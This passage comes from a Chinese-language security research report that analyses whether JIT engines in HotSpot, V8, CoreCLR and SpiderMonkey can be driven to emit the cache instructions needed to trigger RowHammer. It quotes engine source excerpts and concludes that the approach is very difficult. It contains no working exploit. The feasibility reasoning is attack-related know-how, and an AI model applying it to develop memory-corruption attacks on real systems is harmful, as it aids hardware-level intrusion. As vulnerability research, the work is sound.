<h2 id="1-3_触发RowHammer指令">1.3 触发RowHammer指令</h2><p>&emsp;&emsp;为了频繁的使wordline充放电，必须考虑CPU的Cache, 如果当前地址在Cache里面就不会访问内存，也就不会导致wordline的充放电情况。<br>          表1.2<br>| 指令        |    作用                             |<br>| ———– |:——————————–:|<br>| CLFLUSH     | 将数据从Cache中擦除              |<br>| PREFETCH    | 从内存中读取数据并存放在Cache中  |<br>| MOVNT*      | 不经过Cache直接操作数据          |</p>
<p>&emsp;&emsp;表1.2中的指令都可以用来频繁的访问一个内存地址，并使相应的wordline充放电，如果要触发RowHammer， 需要上述指令的配合才能完成。<br>（注: 这些指令并不是惟一的触发方法，比如通过分析物理地址和L3 Cache的映射关系算法(不同的CPU架构实现可能不同)，找到映射到同一个Cache set的一系列地址，通过重复访问这一系列的地址即可触发RowHammer。）</p>
<h1 id="0x02_脚本层面触发RowHammer">0x02 脚本层面触发RowHammer</h1><p>&emsp;&emsp;Google Project Zero给出的POC是直接以汇编的方式来运行，可以用来验证内存是否存在安全问题。当前脚本语言大都存在JIT引擎，如果能够通过脚本控制JIT引擎直接<br>触发RowHammer，将会具有更大的攻击意义。为了分析其可行性，本节研究了Java Hotspot、Chrome V8等执行引擎的运行机制。</p>
<h2 id="2-1_Java_Hotspot">2.1 Java Hotspot</h2><p>&emsp;&emsp;Hotspot是Oracle JDK官方的默认虚拟机，主要用来解释执行Java字节码，其源码位于Openjdk下hotspot目录，可以独立编译。Java字节码是堆栈式指令集，指令数量少，共有256条指令，完成了数据传送、类型转换、程序控制、对象操作、运算和函数调用等功能。Java字节码存储在class文件中，作为Hotspot虚拟机的输入，其在一定程序上是用户可控的。那么能否通过构造class文件，使得Hotspot在执行时完成RowHammer呢? </p>
<p>&emsp;&emsp;Java Hotspot默认对字节码进行解释执行，当某方法被频繁调用，并且达到一定的阈值，即会调用内置的JIT编译器对其进行编译，在下次执行时直接调用编译生成的代码。<br>&emsp;&emsp;Java字节码解释器有两个实现，分别为模版解释器和C++解释器，Hotspot默认使用模版解释器。Java的JIT编译器有三个实现，分别为客户端编译器（C1编译器）、服务器端编译器（C2 编译器）以及Shark编译器（基于LLVM）的编译器。<br>图2.1所示为Java在不同平台下使用的虚拟机。<br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img4.png" alt="img4.png" title=""><br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img5.png" alt="img5.png" title="">  </p>
<center>图2.1</center>

<h3 id="2-1-1_模版解释器触发RowHammer?">2.1.1 模版解释器触发RowHammer?</h3><h4 id="a)_模版解释器工作原理">a) 模版解释器工作原理</h4><p>&emsp;&emsp;模版解释器是一种比较靠近底层的解释器实现，每一个字节码对应一个模版，所有的模版组合在一起构成一个模板表。每一个模版实质上都是一段汇编代码，在虚拟机创建阶段进行初始化。在执行class文件的时候，遍历字节码，每检测到一个字节码就调用相应的汇编代码块进行执行，从而完成对于字节码的解释执行。<br>&emsp;&emsp;为了完成对于字节码的解释执行，Hotspot在初始化时还会生成多种汇编代码块，用来辅助字节码的解释，比如函数入口代码块，异常处理代码块等。查看Hotspot中生成的代码块和模版可以采用命令 java –XX:+PrintInterpreter 指令来完成。<br>&emsp;&emsp;针对各个字节码的模版中汇编代码比较庞大，比如字节码invokevirtual对应的代码块共有352 bytes，字节码putstatic有512 bytes。</p>
<h4 id="b)_解释器能否触发RowHammer?">b) 解释器能否触发RowHammer?</h4><p>&emsp;&emsp;字节码在解释执行的时候会产生汇编代码，那么是否可以通过class文件让解释器生成RowHammer需要的指令呢？<br>通过分析，字节码对应的模版和辅助代码块的指令中没有prefetch, clflush以及movnt*系列指令，所以直接通过构造字节码，然后使用模版解释器来触发RowHammer是不可行的。</p>
<h3 id="2-1-2_JIT编译器触发RowHammer?">2.1.2 JIT编译器触发RowHammer?</h3><h4 id="a)_C1编译器工作原理">a) C1编译器工作原理</h4><p>&emsp;&emsp;JIT编译器也是一种编译器，只不过其是在程序动态运行过程中在需要的时候对代码进行编译。其编译流程与一般编译器基本相同。<br>&emsp;&emsp;C1编译器是客户端使用的JIT编译器实现，其主要追求编译的速度，对于代码的优化等要相对保守。<br>&emsp;&emsp;Hotspot编译器默认是异步编译，有线程CompilerThread负责对特定的方法进行调用，当方法调用次数达到一定阈值时将会调用JIT编译器对方法进行编译，该阈值默认为10000次，可以通过 –XX:+CompileThreshold 参数来设置阈值。<br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img6.png" alt="img6.png" title=""></p>
<center>图2.2</center><br>&emsp;&emsp;1编译器共包含如下几个步骤<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">  _t_compile,</span><br><span class="line">  _t_setup,</span><br><span class="line">  _t_optimizeIR,</span><br><span class="line">  _t_buildIR,</span><br><span class="line">  _t_emit_lir,</span><br><span class="line">  _t_linearScan,</span><br><span class="line">  _t_lirGeneration,</span><br><span class="line">  _t_lir_schedule,</span><br><span class="line">  _t_codeemit,</span><br><span class="line">  _t_codeinstall,</span><br><span class="line">  max_phase_timers</span><br><span class="line">&#125; TimerName;</span><br></pre></td></tr></table></figure><br><br>C1编译器执行流程大致如图2.2所示:<br>1) 生成HIR (build_hir)<br>&emsp;&emsp;C1编译器首先分析JVM字节码流，并将其转换成控制流图的形式，控制流图的基本块使用SSA的形式来表示。HIR是一个层级比较高的中间语言表示形式，离机器相关的代码还有一定的距离。<br>2) 生成LIR (emit_lir)<br>&emsp;&emsp;遍历控制流图的各个基本块，以及基本块中个各个语句，生成相应的LIR形式，LIR是一个比较接近机器语言的表现形式，但是还不是机器可以理解的代码。<br>3) 寄存器分配<br>&emsp;&emsp;LIR中使用的是虚拟寄存器，在该阶段必须为其分配真实可用的寄存器。C1为了保证编译的速度采用了基于线性扫描的寄存器分配算法<br>4) 生成目标代码<br>&emsp;&emsp;真正生成平台相关的机器代码的过程，在该阶段遍历LIR中的所有指令，并生成指令相关的汇编代码。主要是使用了LIR_Assembler类。<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIR_Assembler lir_asm(<span class="keyword">this</span>);</span><br><span class="line">lir_asm.emit_code<span class="function"><span class="params">(hir()-&gt;code())</span>;</span></span><br></pre></td></tr></table></figure><br>&emsp;&emsp;通过遍历LIR_List依次调用，依次调用各个指令相关的emit_code（如表2-3），LIR中的指令都是继承自LIR_Op<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">op-&gt;emit_code<span class="list">(<span class="keyword">this</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>&emsp;&emsp;以LIR_Op1为例，其emit_code方法为<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> LIR_Op1::emit_code(LIR_Assembler* masm) &#123;    <span class="comment">//emit_code</span></span><br><span class="line">  masm-&gt;emit_op1(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;以LIR_Op1为例，其emit_code方法为<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> lir_prefetchr:</span><br><span class="line">  prefetchr(op-&gt;in_opr());</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;最终会调用 prefetchr函数，该函数为平台相关的，不同的平台下实现不同，以x86平台为例，其实现位于assembler_x86.cpp<br><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void Assembler<span class="value">::<span class="function">prefetchr</span>(Address src) &#123;</span><br><span class="line">  <span class="function">assert</span>(VM_Version::<span class="function">supports_3dnow_prefetch</span>(), <span class="string">"must support"</span>);</span></span><br><span class="line">  InstructionMark <span class="function">im</span>(this);</span><br><span class="line">  <span class="function">prefetch_prefix</span>(src);</span><br><span class="line">  <span class="function">emit_byte</span>(0x0D);</span><br><span class="line">  <span class="function">emit_operand</span>(rax, src); <span class="comment">// 0, src</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;最终将会生成相应的机器码。<br><br>#### b) 能否触发RowHammer<br>&emsp;&emsp;C1编译器是否能够触发RowHammer? 经过分析发现，在x86平台下封装了prefetch相关的指令，确实是有希望控制产生prefetch指令。<br>&emsp;&emsp;从底层向上分析，如果要生成prefetch指令，在LIR层需要出现LIR_op1操作，且操作码需要为lir_prefetchr或者lir_prefetchw，进一步向上层分析，要在LIR层出现这样的指令，在从字节码到HIR的过程中必须能够调用到GraphBuilder::append_unsafe_prefetch函数。该方法在GraphBuilder::try_inline_instrinsics函数中调用，进一步分析只需调用sun.misc.unsafe的prefetch操作即可触发。通过深入分析，Hotspot确实是支持prefetch操作，然而在Java的运行库rt.jar中，sun.misc.unsafe并没有声明prefetch操作，导致无法直接调用，需要更改rt.jar才能触发成功。这样就失去了攻击的意义。<br><br>&emsp;&emsp;在Hotspot中还存在clflush这种指令，在hotspot的初始化阶段，其会生成一个代码块。如下所示：<br><br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__ bind<span class="list">(<span class="keyword">flush_line</span>)</span><span class="comment">;                         </span></span><br><span class="line">__ clflush<span class="list">(<span class="keyword">Address</span><span class="list">(<span class="keyword">addr</span>, <span class="number">0</span>)</span>)</span><span class="comment">;          //addr: address to flush </span></span><br><span class="line">__ addptr<span class="list">(<span class="keyword">addr</span>, ICache:<span class="keyword">:line_size</span>)</span><span class="comment">;                                         </span></span><br><span class="line">__ decrementl<span class="list">(<span class="keyword">lines</span>)</span><span class="comment">;                   //lines: range to flush</span></span><br><span class="line">__ jcc<span class="list">(<span class="keyword">Assembler</span>:<span class="keyword">:notZero</span>, flush_line)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><br>该部分代码在C1编译器编译完成之后有调用<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// done</span></span><br><span class="line">masm<span class="comment">()</span>-&gt;flush<span class="comment">()</span>;             <span class="comment">//invoke ICache flush</span></span><br></pre></td></tr></table></figure><br>对当前代码存储的区域进行cache flush<br><br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">void AbstractAssembler<span class="value">::<span class="function">flush</span>() &#123;</span><br><span class="line">  <span class="function">sync</span>();</span></span><br><span class="line">  ICache<span class="value">::<span class="function">invalidate_range</span>(<span class="function">addr_at</span>(<span class="number">0</span>), <span class="function">offset</span>());</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>&emsp;&emsp;这种方法可以对内存做cache flush, 主要问题在于代码存储的区域在堆中是随机分配的，无法直接指定cache flush的区域，而且由于涉及到编译的操作，无法在短时间内大量产生clflush指令。<br><br>#### c) 其它编译器实现<br>&emsp;&emsp;C2编译器与C1编译器有一定的相似性又有很大的不同，由于主要在服务器端使用所以C2编译器更加注重编译后代码的执行效率，所有在编译过程中相对C1编译器做了大量的优化操作，但是在生成汇编代码的时候两者使用的是同一个抽象汇编，所以C2编译器与C1编译器应该大体相同，能够生成prefetch指令，但是在默认的情形下无法直接使用。<br>&emsp;&emsp;Shark编译器是基于LLVM实现的，一般都不会开启，没有对该编译器进行进一步的分析。<br><br><h2> 2.2 Chrome V8</h2><br>&emsp;&emsp;V8是Google开源的Javascript引擎，采用C++编写，可独立运行。V8会直接将JavaScript代码编译成本地机器码，没有中间代码，没有解释器。其执行机制是将Javascript代码转换成抽象语法树，然后直接walk抽象语法树，生成相应的机器码。<br>&emsp;&emsp;在V8生成机器码的过程中无法生成prefetch, clflush, movnt*系列指令。但是在V8执行的过程中可能会引入prefetch指令。<br>&emsp;&emsp;产生prefetch的函数为<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MemMoveFunction <span class="function">CreateMemMoveFunction</span>() &#123;</span><br><span class="line"></span><br><span class="line">  __ <span class="function">prefetch</span>(<span class="function">Operand</span>(src, 0), 1);</span><br><span class="line">  __ <span class="function">cmp</span>(count, kSmallCopySize);    <span class="comment">//kSmallCopySize=8</span></span><br><span class="line">  __ <span class="function">j</span>(below_equal, &amp;small_size);  </span><br><span class="line">  __ <span class="function">cmp</span>(count, kMediumCopySize);   <span class="comment">//kMediumCopySize=63</span></span><br><span class="line">  __ <span class="function">j</span>(below_equal, &amp;medium_size);</span><br><span class="line">  __ <span class="function">cmp</span>(dst, src);</span><br><span class="line">  __ <span class="function">j</span>(above, &amp;backward);</span><br></pre></td></tr></table></figure><br><br>&emsp;&emsp;该函数的主要作用是当缓冲区无法满足指令的存储时，需要将缓冲区扩大一倍，在该过程中会调用一次prefetch指令，但是调用的此处远远不足RowHammer触发的条件。<br><br><br><h2> 2.3 .NET CoreCLIR</h2><br>&emsp;&emsp;CoreCLR是.NET的执行引擎，RyuJIT是.NET的JIT实现，目前已经开源。作为Java的竞争对手，.NET大量参考了Java的实现机制，从字节码的设计，到编译器的实现等，都与Java有几分相似。在RyuJIT的指令集定义中只定义了一些常见的指令(图2.3)，但是没有RowHammer需要的指令，所以无法直接触发。但是在CoreCLR的gc中存在prefetch操作(表2.12)，然而该指令默认是被置为无效的(表2.13)。<br><br><br><img src="/cn/2015/06/09/Research-report-on-using-JIT-to-trigger-RowHammer/img7.png" alt="img7.png" title=""><br><center>图2.3</center><br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void gc_heap<span class="number">::</span>relocate_survivor_helper (BYTE* plug, BYTE* plug_end)</span><br><span class="line">&#123;</span><br><span class="line">    BYTE*  x = plug<span class="comment">;</span></span><br><span class="line">    while (x &lt; plug_end)</span><br><span class="line">    &#123;</span><br><span class="line">        size_t s = size (x)<span class="comment">;</span></span><br><span class="line">        BYTE* next_obj = x + Align (s)<span class="comment">;</span></span><br><span class="line">        Prefetch (next_obj)<span class="comment">;</span></span><br><span class="line">        relocate_obj_helper (x, s)<span class="comment">;</span></span><br><span class="line">        assert (s &gt; 0)<span class="comment">;</span></span><br><span class="line">        x = next_obj<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><center>图2.4</center>

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#define PREFETCH</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifdef</span> PREFETCH</span></span><br><span class="line">__declspec(naked) <span class="keyword">void</span> __<span class="function">fastcall <span class="title">Prefetch</span><span class="params">(<span class="keyword">void</span>* addr)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">   __asm &#123;</span><br><span class="line">       PREFETCHT0 [ECX]</span><br><span class="line">        ret</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span> <span class="comment">//PREFETCH</span></span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Prefetch</span> <span class="params">(<span class="keyword">void</span>* addr)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">//PREFETCH</span></span></span><br></pre></td></tr></table></figure>
<center>图2.5</center>

<h2 id="2-4_Firfox_SpiderMonkey">2.4 Firfox SpiderMonkey</h2><p>&emsp;&emsp;SpiderMonkey是Firfox默认使用的带有JIT的Javascript引擎，在SpiderMonkey中没有RowHammer所需要的指令出现。</p>
<h1 id="0x03_总结">0x03 总结</h1><p>&emsp;&emsp;本文研究的主要目的是希望通过JIT引擎来触发RowHammer的执行，为了提高脚本语言的执行效率，当前绝大多数脚本引擎都带有JIT编译器以提高运行的效率。本文研究了Hotspot、V8、RyuJIT和SpiderMonkey，其中并没有找到比较好的触发RowHammer的方法，当然依旧有一些JIT还没被研究，不过通过以上研究证明JIT触发的方式非常困难，原因主要有以下几点:</p>
<p>1) RowHammer的触发条件比较苛刻，64ms内触发成功也就意味着无关指令的数目必须很少，否者在64ms内wordline无法充放电足够的次数。</p>
<p>2) Cache相关的指令并不常用，RowHammer运行需要使用CLFLUSH, PREFETCH, MOVNT*系列指令，这些指令在实际的使用过程中并不常见，在用户态进行Cache相关操作的情形比较少见。</p>
<p>3) 站在JIT开发人员的角度考虑，为了实现跨平台，一般会对指令进行抽象，然后在各个平台上具体实现。抽象的指令一般都尽可能少，因为每抽象一个指令就需要再添加大量的代码。在分析的JIT引擎中只有hotspot抽象了prefetch指令，引擎都尽可能少的去抽象编译器要用到的指令，想通过脚本直接生成需要的汇编指令很困难。（特例是如果采用了第三方引擎(比如AsmJit)，引擎会抽象所有的汇编指令，则有更大的可能性触发，然而当前主流语言的JIT部分大都是独立开发，而第三方引擎则多是从这些代码中提取并逐步完善的）。</p>
<p>4) 在整个分析过程中发现指令出现的原因主要是辅助JIT编译，比如使用prefetch提高某些数据存取的速度，使用CLFLUSH刷新指令缓冲区等。指令出现的次数与频率，远远达不到RowHammer的要求。</p>
<h1 id="参考资料">参考资料</h1><ol>
<li>Google Project Zero<br><a href="http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html" target="_blank" rel="external">http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html</a></li>
<li>Paper: Flipping Bits in Memory Without Accessing Them: An Experimental Study of DRAM Disturbance Errors  <a href="http://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf" target="_blank" rel="external">http://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf</a></li>
<li>高级语言虚拟机群组 <a href="http://hllvm.group.iteye.com/" target="_blank" rel="external">http://hllvm.group.iteye.com/</a></li>
<li>各语言开放的源代码</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>RowHammer漏洞是DDR3内存中存在的问题，通过频繁的访问内存中的一行数据，会导致临近行的数据发生反转。然而由于其运行需要在目标主机上大量运行特定的代码，实施攻击存在很大的难度。本文旨在研究能否通过Javascript等脚本语言的动态执行触发RowHammer，如果能够成功将极大增加RowHammer的攻击性。为了验证该思路，本文分析了Java Hotspot、Chrome V8、.NET CoreCLR以及Firefox SpiderMonkey的实现机制并给出了可行性分析。<br>]]>
    
    </summary>
    
      <category term="JIT" scheme="http://xlab.tencent.com/cn/tags/JIT/"/>
    
      <category term="Javascript" scheme="http://xlab.tencent.com/cn/tags/Javascript/"/>
    
      <category term="RowHammer" scheme="http://xlab.tencent.com/cn/tags/RowHammer/"/>
    
  </entry>
  
</feed>
